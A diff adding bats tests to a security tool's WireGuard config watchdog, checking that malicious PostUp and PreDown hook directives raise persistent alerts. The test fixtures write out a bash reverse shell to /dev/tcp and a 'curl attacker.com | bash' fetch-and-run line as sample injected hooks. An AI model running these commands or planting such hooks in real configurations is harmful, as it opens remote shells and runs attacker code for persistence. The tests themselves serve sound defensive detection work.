@@ -212,3 +212,50 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-wireguard -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): wireguard-config-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 tunnel-event-triggered root-exec persistence — alert MUST
+    # persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"wireguard_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (PreDown directive — full 4-axis hook coverage with PreUp/PostUp/PostDown)" {
+    # The 4 hook directives are PreUp/PostUp/PreDown/PostDown. Existing
+    # tests cover 3; lock the 4th (PreDown) too.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPreDown = /tmp/.predown\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (PostUp under /dev/shm — tmpfs writable-root coverage on hook axis)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /dev/shm/.up\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in PostUp)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = curl -s http://attacker.com/p | bash\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
